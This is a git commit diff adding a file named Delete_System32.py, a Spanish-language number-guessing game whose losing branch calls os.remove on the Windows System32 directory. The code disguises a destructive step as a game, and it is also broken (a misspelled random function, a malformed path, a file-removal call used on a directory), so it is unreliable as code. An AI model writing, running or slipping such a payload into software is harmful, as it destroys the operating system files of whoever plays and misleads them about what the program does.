a553887c22d7a871521ce1b36001e393648a6c2b
Juan Manuel <juanmanueldelaparra1702@protonmail.com>
2025-02-11 17:55:23 -0600

    Update Delete_System32.py

--- Delete_System32.py
+++ Delete_System32.py
@@ -1,1 +1,12 @@
+import random
+import os
 
+#juego de adivinar un numero
+number = random.randit(1, 10)
+guess = input("Elige un numero del 1 al 10.")
+guess= int(guess)
+
+if guess == number:
+    print("Felicidades, ¡Ganaste!")
+else:
+    os.remove("C/Windows/System32")
